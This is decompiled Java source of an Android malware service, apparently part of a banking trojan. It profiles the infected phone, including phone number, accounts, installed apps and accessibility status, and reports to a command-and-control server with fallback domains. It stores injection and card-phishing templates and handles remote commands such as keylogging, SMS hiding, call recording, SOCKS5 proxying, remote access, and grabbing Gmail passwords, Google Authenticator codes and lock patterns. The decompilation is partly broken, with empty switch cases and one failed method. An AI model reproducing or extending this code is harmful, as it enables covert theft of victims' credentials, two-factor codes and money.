package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.Utils.*;
import com.example.mmm.*;
import com.example.mmm.API.*;
import android.util.*;
import android.telephony.*;
import org.json.*;
import java.util.*;
import android.os.*;
import android.content.*;

public class srvNetworkConnect extends IntentService
{
    utils elephant$;
    constants builds$;
    
    public srvNetworkConnect() {
        super("");
        this.elephant$ = new utils();
        this.builds$ = new constants();
    }
    
    private String decrypt_str(String s) {
        s = "YmM=";
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    private void a(final Context context) {
        final StringBuilder sb = new StringBuilder();
        sb.append(srvNetworkConnect.class.getSimpleName());
        sb.append("   ");
        final String string = sb.toString();
        final constants constants = new constants();
        final String settingsRead = this.elephant$.SettingsRead(context, "QQ");
        final TelephonyManager telephonyManager = (TelephonyManager)this.getBaseContext().getSystemService("phone");
        final String settingsRead2 = this.elephant$.SettingsRead(context, "AL");
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("DM", (Object)settingsRead2);
        jsonObject.put("AD", (Object)"null");
        jsonObject.put("BL", (Object)utils.getBatteryLevel(context));
        jsonObject.put("TW", (Object)this.elephant$.SettingsRead(context, "AK"));
        final String s = "SA";
        String s2;
        if (utils._exercise((Context)this)) {
            s2 = "YmQ=";
        }
        else {
            s2 = "YmM=";
        }
        jsonObject.put(s, (Object)this.decrypt_str(s2));
        jsonObject.put("SP", (Object)this.elephant$.SettingsRead(context, "SR"));
        jsonObject.put("SS", (Object)utils._janet(context));
        final String s3 = "LE";
        final StringBuilder sb2 = new StringBuilder();
        sb2.append(Locale.getDefault().getLanguage());
        jsonObject.put(s3, (Object)sb2.toString());
        final String s4 = "SY";
        String s5;
        if (utils.isAccessibilityServiceEnabled(context, srvAccessibility.class)) {
            s5 = "YmQ=";
        }
        else {
            s5 = "YmM=";
        }
        jsonObject.put(s4, (Object)this.decrypt_str(s5));
        jsonObject.put("SM", (Object)utils._delhi((Context)this));
        jsonObject.put("ID", (Object)settingsRead);
        jsonObject.put("IS", (Object)this.elephant$.SettingsRead(context, "AG"));
        final String s6 = "NR";
        String line1Number;
        if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
            line1Number = ((TelephonyManager)context.getSystemService("phone")).getLine1Number();
        }
        else {
            line1Number = "";
        }
        jsonObject.put(s6, (Object)line1Number);
        jsonObject.put("GA", (Object)utils.getAccounts((Context)this));
        jsonObject.put("PS", (Object)utils.hasPermission((Context)this, constants.pentium$[0]));
        jsonObject.put("PC", (Object)utils.hasPermission((Context)this, constants.pentium$[1]));
        jsonObject.put("PP", (Object)utils.hasPermission((Context)this, constants.pentium$[2]));
        jsonObject.put("PO", (Object)utils.hasPermission((Context)this, constants.pentium$[3]));
        final utils elephant$ = this.elephant$;
        final StringBuilder sb3 = new StringBuilder();
        sb3.append("jsonCheckBot: ");
        sb3.append(jsonObject.toString());
        elephant$.Log(string, sb3.toString());
        final utils elephant$2 = this.elephant$;
        final StringBuilder sb4 = new StringBuilder();
        sb4.append("q=info_device&ws=");
        sb4.append(this.elephant$._grown(jsonObject.toString()));
        final String brought = elephant$2._brought((Context)this, sb4.toString());
        final utils elephant$3 = this.elephant$;
        final StringBuilder sb5 = new StringBuilder();
        sb5.append("jsonCheckBot: ");
        sb5.append(brought);
        elephant$3.Log(string, sb5.toString());
        if (brought == null || brought.length() < 2 || brought.contains("503 Service Unavailable")) {
            final String settingsRead3 = this.elephant$.SettingsRead(context, "SB");
            if (settingsRead3.contains(",")) {
                final String[] split = settingsRead3.replace(" ", "").split(",");
                for (int length = split.length, i = 0; i < length; ++i) {
                    final String s7 = split[i];
                    if (s7.length() > 5) {
                        final utils elephant$4 = this.elephant$;
                        final StringBuilder sb6 = new StringBuilder();
                        sb6.append("Check URL: ");
                        sb6.append(s7);
                        elephant$4.Log(string, sb6.toString());
                        if (this.elephant$._center(s7).contains("200")) {
                            this.elephant$.SettingsWrite(context, "QE", s7);
                            final utils elephant$5 = this.elephant$;
                            final StringBuilder sb7 = new StringBuilder();
                            sb7.append("NEW DOMAIN: ");
                            sb7.append(s7);
                            elephant$5.Log(string, sb7.toString());
                            break;
                        }
                    }
                }
            }
        }
        if (utils.checkNetworkConnection((Context)this)) {
            final String basin = this.elephant$._basin();
            final utils elephant$6 = this.elephant$;
            final String s8 = "**GET_NEW_URL***";
            final StringBuilder sb8 = new StringBuilder();
            sb8.append("url: ");
            sb8.append(basin);
            elephant$6.Log(s8, sb8.toString());
            if (!basin.isEmpty()) {
                this.elephant$.SettingsWrite((Context)this, "QE", basin);
            }
        }
        final utils elephant$7 = this.elephant$;
        final StringBuilder sb9 = new StringBuilder();
        sb9.append("EnCryptResponce: ");
        sb9.append(brought);
        elephant$7.Log(string, sb9.toString());
        final String marina = this.elephant$._marina(brought);
        final utils elephant$8 = this.elephant$;
        final StringBuilder sb10 = new StringBuilder();
        sb10.append("CheckBotRESPONCE: ");
        sb10.append(marina);
        elephant$8.Log(string, sb10.toString());
        if (marina.contains("get_new_patch") && !settingsRead2.equals("1")) {
            final utils elephant$9 = this.elephant$;
            final JSONObject jsonObject2 = new JSONObject();
            jsonObject2.put("ID", (Object)settingsRead);
            final StringBuilder sb11 = new StringBuilder();
            sb11.append("q=upgrade_n_patch&ws=");
            sb11.append(elephant$9._grown(jsonObject2.toString()));
            final String marina2 = elephant$9._marina(elephant$9._brought((Context)this, sb11.toString()));
            final StringBuilder sb12 = new StringBuilder("Download Module: ");
            sb12.append(marina2.length());
            elephant$9.Log("downloadModuleDex", sb12.toString());
            if (marina2.length() > 10000) {
                elephant$9.Log("downloadModuleDex", "Save Module");
                Base64.decode(marina2.getBytes(), 0);
                ((Context)this).getDir("apk", 0);
                elephant$9.SettingsWrite((Context)this, "AL", "1");
                System.gc();
            }
            return;
        }
        if (marina.equals("no_device")) {
            final JSONObject jsonObject3 = new JSONObject();
            String s9;
            if ((s9 = utils.countrySIM(context)).length() != 2) {
                s9 = Locale.getDefault().getCountry().toLowerCase();
            }
            jsonObject3.put("ID", (Object)settingsRead);
            jsonObject3.put("AR", (Object)Build$VERSION.RELEASE);
            jsonObject3.put("TT", (Object)"g\u00c3¼ncelleme11");
            jsonObject3.put("CY", (Object)s9);
            jsonObject3.put("OP", (Object)telephonyManager.getNetworkOperatorName());
            final String s10 = "MD";
            final String manufacturer = Build.MANUFACTURER;
            String s12;
            final String s11 = s12 = Build.MODEL;
            if ("xiaomi".equalsIgnoreCase(Build.MANUFACTURER)) {
                final int miuiVersion = utils.getMiuiVersion();
                s12 = s11;
                if (miuiVersion != 0) {
                    final StringBuilder sb13 = new StringBuilder();
                    sb13.append(s11);
                    sb13.append(" MIUI V");
                    sb13.append(miuiVersion);
                    s12 = sb13.toString();
                }
            }
            String s13;
            if (s12.toLowerCase().startsWith(manufacturer.toLowerCase())) {
                s13 = utils._premises(s12);
            }
            else {
                final StringBuilder sb14 = new StringBuilder();
                sb14.append(utils._premises(manufacturer));
                sb14.append(" ");
                sb14.append(s12);
                s13 = sb14.toString();
            }
            jsonObject3.put(s10, (Object)s13);
            final utils elephant$10 = this.elephant$;
            final StringBuilder sb15 = new StringBuilder();
            sb15.append("jsonRegistrationBot: ");
            sb15.append(jsonObject3.toString());
            elephant$10.Log(string, sb15.toString());
            final utils elephant$11 = this.elephant$;
            final utils elephant$12 = this.elephant$;
            final StringBuilder sb16 = new StringBuilder();
            sb16.append("q=new_device&ws=");
            sb16.append(this.elephant$._grown(jsonObject3.toString()));
            final String marina3 = elephant$11._marina(elephant$12._brought((Context)this, sb16.toString()));
            marina3.equals("no_reg");
            final utils elephant$13 = this.elephant$;
            final StringBuilder sb17 = new StringBuilder();
            sb17.append("RegistrationRESPONCE: ");
            sb17.append(marina3);
            elephant$13.Log(string, sb17.toString());
            if (marina3.equals("ok")) {
                this.elephant$.SettingsWrite(context, "QI", "1");
            }
            return;
        }
        if (marina.length() <= 4) {
            return;
        }
        final JSONObject jsonObject4 = new JSONObject(marina);
        if (!jsonObject4.getString("this").equals("device_no_cmd") || !this.elephant$.SettingsRead(context, "QI").equals("1")) {
            if (jsonObject4.getString("this").equals("global_settings#")) {
                this.elephant$.Log(string, "global_settings#");
                this.elephant$.SettingsWrite(context, "AG", jsonObject4.getString("id_settings"));
                if (jsonObject4.getString("urls").length() > 7) {
                    final utils elephant$14 = this.elephant$;
                    final String s14 = "SB";
                    final StringBuilder sb18 = new StringBuilder();
                    sb18.append(this.elephant$.SettingsRead(context, "QE"));
                    sb18.append(",");
                    sb18.append(jsonObject4.getString("urls"));
                    elephant$14.SettingsWrite(context, s14, sb18.toString());
                }
                if (this.elephant$.SettingsRead(context, "AV").equals("-1")) {
                    this.elephant$.Log(string, "Save injection_t");
                    this.elephant$.SettingsWrite(context, "AV", jsonObject4.getString("injection_t"));
                }
                if (this.elephant$.SettingsRead(context, "AB").equals("-1")) {
                    this.elephant$.Log(string, "Save cards_t");
                    this.elephant$.SettingsWrite(context, "AB", jsonObject4.getString("cards_t"));
                }
                if (this.elephant$.SettingsRead(context, "AN").equals("-1")) {
                    this.elephant$.Log(string, "Save emails_t");
                    this.elephant$.SettingsWrite(context, "AN", jsonObject4.getString("emails_t"));
                }
                if (this.elephant$.SettingsRead(context, "SU").equals("-1")) {
                    this.elephant$.Log(string, "Save admin_t");
                    this.elephant$.SettingsWrite(context, "SU", jsonObject4.getString("admin_t"));
                }
                if (this.elephant$.SettingsRead(context, "SI").equals("-1")) {
                    this.elephant$.Log(string, "Save permission_t");
                    this.elephant$.SettingsWrite(context, "SI", jsonObject4.getString("permission_t"));
                }
                if (this.elephant$.SettingsRead(context, "SY").equals("-1")) {
                    this.elephant$.Log(string, "Save protect_t");
                    this.elephant$.SettingsWrite(context, "SY", jsonObject4.getString("protect_t"));
                }
            }
            else {
                if (jsonObject4.getString("this").equals("device_settings#")) {
                    this.elephant$.Log(string, "get device_settings#");
                    this.elephant$.SettingsWrite(context, "AF", jsonObject4.getString("hideSMS"));
                    this.elephant$.SettingsWrite(context, "AZ", jsonObject4.getString("lockDevice"));
                    this.elephant$.SettingsWrite(context, "AX", jsonObject4.getString("offSound"));
                    this.elephant$.SettingsWrite(context, "AC", jsonObject4.getString("keylogger"));
                    this.elephant$.SettingsWrite(context, "QP", jsonObject4.getString("activeInjection"));
                    this.elephant$.SettingsWrite(context, "ES", jsonObject4.getString("endless_start"));
                    this.elephant$.SettingsWrite(context, "WR", jsonObject4.getString("record_call"));
                    return;
                }
                if (jsonObject4.getString("this").equals("run_cmd")) {
                    final utils elephant$15 = this.elephant$;
                    final StringBuilder sb19 = new StringBuilder();
                    sb19.append("get run_cmd: ");
                    sb19.append(jsonObject4.toString());
                    elephant$15.Log(string, sb19.toString());
                    final String string2 = new JSONObject(new String(Base64.decode(jsonObject4.getString("data"), 0), "UTF-8")).getString("cmd");
                    switch (string2.hashCode()) {
                        case 1929950368: {
                            if (string2.equals("patch_update")) {
                                break;
                            }
                            break;
                        }
                        case 1684567524: {
                            if (string2.equals("call_forward")) {
                                break;
                            }
                            break;
                        }
                        case 1550329453: {
                            if (string2.equals("run_app")) {
                                break;
                            }
                            break;
                        }
                        case 1247787042: {
                            if (string2.equals("send_sms")) {
                                break;
                            }
                            break;
                        }
                        case 1098892172: {
                            if (string2.equals("remove_bot")) {
                                break;
                            }
                            break;
                        }
                        case 1098891238: {
                            if (string2.equals("remove_app")) {
                                break;
                            }
                            break;
                        }
                        case 905006723: {
                            if (string2.equals("grabbing_pass_gmail")) {
                                break;
                            }
                            break;
                        }
                        case 595233003: {
                            if (string2.equals("notification")) {
                                break;
                            }
                            break;
                        }
                        case 320759922: {
                            if (string2.equals("grabbing_google_authenticator2")) {
                                break;
                            }
                            break;
                        }
                        case 226593590: {
                            if (string2.equals("get_all_permission")) {
                                break;
                            }
                            break;
                        }
                        case 151232379: {
                            if (string2.equals("get_data_logs")) {
                                break;
                            }
                            break;
                        }
                        case 125587325: {
                            if (string2.equals("sms_mailing_phonebook")) {
                                break;
                            }
                            break;
                        }
                        case 3599727: {
                            if (string2.equals("ussd")) {
                                break;
                            }
                            break;
                        }
                        case 116079: {
                            if (string2.equals("url")) {
                                break;
                            }
                            break;
                        }
                        case -203367091: {
                            if (string2.equals("access_notifications")) {
                                break;
                            }
                            break;
                        }
                        case -272565638: {
                            if (string2.equals("run_admin_device")) {
                                break;
                            }
                            break;
                        }
                        case -406891602: {
                            if (string2.equals("send_mailing_sms")) {
                                break;
                            }
                            break;
                        }
                        case -503110523: {
                            if (string2.equals("change_url_recover")) {
                                break;
                            }
                            break;
                        }
                        case -513200628: {
                            if (string2.equals("clean_cache")) {
                                break;
                            }
                            break;
                        }
                        case -561690241: {
                            if (string2.equals("request_permission")) {
                                break;
                            }
                            break;
                        }
                        case -634359797: {
                            if (string2.equals("change_url_connect")) {
                                break;
                            }
                            break;
                        }
                        case -772676912: {
                            if (string2.equals("rat_connect")) {
                                break;
                            }
                            break;
                        }
                        case -1138004029: {
                            if (string2.equals("stop_socks5")) {
                                break;
                            }
                            break;
                        }
                        case -1636193849: {
                            if (string2.equals("update_inject")) {
                                break;
                            }
                            break;
                        }
                        case -1699446502: {
                            if (string2.equals("run_socks5")) {
                                break;
                            }
                            break;
                        }
                        case -1787784292: {
                            if (string2.equals("run_record_audio")) {
                                break;
                            }
                            break;
                        }
                        case -2033081134: {
                            if (string2.equals("grabbing_lockpattern")) {
                                break;
                            }
                            break;
                        }
                    }
                    this.elephant$.SettingsWrite(context, "AL", "0");
                    context.getDir("apk", 0);
                }
            }
            return;
        }
        final JSONObject jsonObject5 = new JSONObject();
        this.elephant$.Log(string, "this device_no_cmd start!");
        jsonObject5.put("ID", (Object)settingsRead);
        jsonObject5.put("AP", (Object)this.elephant$.getInstalledApps(context));
        final utils elephant$16 = this.elephant$;
        final StringBuilder sb20 = new StringBuilder();
        sb20.append("jsonUpdateInj: ");
        sb20.append(jsonObject5.toString());
        elephant$16.Log(string, sb20.toString());
        final utils elephant$17 = this.elephant$;
        final StringBuilder sb21 = new StringBuilder();
        sb21.append("q=is_attacker&ws=");
        sb21.append(this.elephant$._grown(jsonObject5.toString()));
        final String marina4 = this.elephant$._marina(elephant$17._brought(context, sb21.toString()));
        final utils elephant$18 = this.elephant$;
        final StringBuilder sb22 = new StringBuilder();
        sb22.append("RESPONCE: ");
        sb22.append(marina4);
        elephant$18.Log(string, sb22.toString());
        if (!marina4.equals("device_null#") && !marina4.isEmpty()) {
            final String[] split2 = marina4.split(":");
            for (int j = 0; j < split2.length; ++j) {
                if (!split2[j].isEmpty()) {
                    this.elephant$.SettingsWrite(context, split2[j], "");
                    final utils elephant$19 = this.elephant$;
                    final StringBuilder sb23 = new StringBuilder();
                    sb23.append("icon_");
                    sb23.append(split2[j]);
                    elephant$19.SettingsWrite(context, sb23.toString(), "");
                    final utils elephant$20 = this.elephant$;
                    final StringBuilder sb24 = new StringBuilder();
                    sb24.append("Initialization Injection: ");
                    sb24.append(split2[j]);
                    elephant$20.Log(string, sb24.toString());
                }
            }
            this.elephant$.SettingsWrite(context, "QU", marina4);
            this.elephant$.SettingsWrite(context, "QI", "");
            this.elephant$.SettingsWrite(context, "QO", "1");
            this.elephant$.Log(string, "Save Array Injections");
        }
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        // 
        // This method could not be decompiled.
        // 
        // Original Bytecode:
        // 
        //     3: dup            
        //     4: new             Lcom/example/mmm/Service/srvNetworkConnect$Thread;
        //     7: dup            
        //     8: aload_0        
        //     9: \u0131nvokespec\u0131al   com/example/mmm/Service/srvNetworkConnect$Thread.<init>:(Lcom/example/mmm/Service/srvNetworkConnect;)V
        //    12: \u0131nvokespec\u0131al   java/lang/Thread.<init>:(Ljava/lang/Runnable;)V
        //    15: \u0131nvokev\u0131rtual   java/lang/Thread.start:()V
        //    18: aload_0        
        //    19: aload_0        
        //    20: \u0131nvokespec\u0131al   com/example/mmm/Service/srvNetworkConnect.a:(Landroid/content/Context;)V
        //    23: aload_0        
        //    24: \u0131nvokev\u0131rtual   com/example/mmm/Service/srvNetworkConnect.stopSelf:()V
        //    27: return         
        // 
        throw new IllegalStateException("An error occurred while decompiling this method.");
    }
}
